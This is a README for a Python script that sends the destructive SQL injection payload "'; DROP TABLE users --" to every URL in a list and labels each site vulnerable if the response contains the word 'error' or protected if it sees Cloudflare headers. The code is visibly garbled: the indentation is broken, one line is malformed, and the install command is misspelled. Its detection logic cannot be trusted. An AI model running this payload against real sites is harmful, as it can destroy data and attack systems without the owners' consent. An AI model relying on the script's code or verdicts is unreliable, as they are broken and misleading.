# SQLI-Detetcor
The script can distinguish between URLs that are immune to SQL Injection and protected by Cloudflare. 


# Requirements:
Before you begin, make sure you have the following:
Python 3 is installed on your system. It can be downloaded from the official Python website.
Request library used to send HTTP requests.


It can be installed using pip.
pip install request

# step 1:Script overview


This script is designed to check a list of URLs for SQL injection vulnerabilities and determine whether a URL is protected by Cloudflare. Use the Requests library for  HTTP requests and the urllib.parse module for URL manipulation.

Here's a brief overview of how the script works:
It takes a list of URLs as input, either from a file or as a single URL. For each URL, it checks for SQL  Injection vulnerabilities by appending a payload to the URL's query parameter. It analyzes the response for  signs of SQL Injection and Cloudflare protection. The script displays the results in the terminal.

# Step 2:Script Implementation

# Let's break down the script step by step: Import the necessary modules:


    import sys
    import requests
    import urllib.parse
    from urllib3.exceptions import NewConnectionError, MaxRetryError, ConnectTimeoutError


# Define the SQL Injection payload (modify as needed):


    payload = "'; DROP TABLE users --"

# Create a function check_sql_injection(url) to check SQL Injection for a given URL:
    def check_sql_injection(url):
        try:

# Check if the URL has a scheme (http:// or https://)
            if not url.startswith("http://") and not url.startswith("https://"):

# Add "https://" if no scheme is specified
                url = "https://" + url 

 # Encode the SQL injection payload
            encoded_payload = urllib.parse.quote(payload)

 # Append the encoded payload as a query parameter
            target_url = f"{url}?q={encoded_payload}"

 # Send an HTTP GET request to the modified URL with a timeout
            response = requests.get(target_url, timeout=10)

 # Check for Cloudflare protection and SQL Injection signs in the response

            if "Server" in response.headers and "cloudflare" in response.headers["Server"].lower():
                print(f"Cloudflare Protection Detected for {url}")
            else:
                if "error" in response.text.lower():
                print(f"Possible SQL Injection Detected for {url}")
            else:
                print(f"No SQL Injection Detected for {url}")

    except (NewConnectionError, MaxRetryError, ConnectTimeoutError):
        print(f"Connection Error:Skipping {url}")
    except requests.exceptions.ConnectionError:
        print(f"Connection Error:Skipping {url}")

# Check the command-line arguments and process the input:


    if len(sys.argv) < 2>")
        print("Usage: python script.py <URL or file>")
        sys.exit(1)

# Get the URL or file name from the command-line argument
    input_arg = sys.argv[1]
    if input_arg.endswith(".txt"):
    
 # Read URLs from the file
     with open(input_arg, "r") as file:
         urls = [line.strip() for line in file]
    
# Iterate through the list of URLs and check for SQL injection
     for url in urls:
         check_sql_injection(url)
else:
# The input argument is a single URL, check it for SQL injection
    check_sql_injection(input_arg)
 
# Step 3:Running the Script

To run the script, you can use the following command:

python script.py url

Replace with either a single URL or a file containing a list of URLs.




# Conclusion:

With this Python script, you can quickly scan a list of URLs for potential SQL injection vulnerabilities. It is important to regularly test your web applications for security vulnerabilities and take appropriate steps to protect sensitive data. Use this script responsibly and only on sites that you have permission to test. Always follow ethical hacking practices and obtain proper permissions before scanning web applications for vulnerabilities.




# Disclaimer:
This script is for educational purposes only. Do not use it to perform any unauthorized or malicious activities. Always ensure that you have proper authorization to test and analyze websites for security vulnerabilities.
